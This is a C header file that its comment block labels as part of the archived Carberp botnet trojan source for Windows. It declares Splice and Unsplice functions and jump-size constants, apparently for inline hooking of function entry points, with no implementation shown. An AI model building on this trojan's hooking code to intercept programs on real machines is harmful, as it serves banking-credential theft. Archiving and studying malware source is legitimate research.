/*
  name      Carberp Botnet
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    krisyotam
  archived  krisyotam (2026)
  notes     —
 */
#ifndef _SPLICE_H_
#define _SPLICE_H_

#define JMP_SIZE		5
#define	OLD_BYTES_SIZE	20

VOID Splice(PVOID pvAddr,PVOID pvNew,PVOID pvOldAddr);
VOID Unsplice(PVOID pvAddr,PVOID pvOldAddr);

#endif
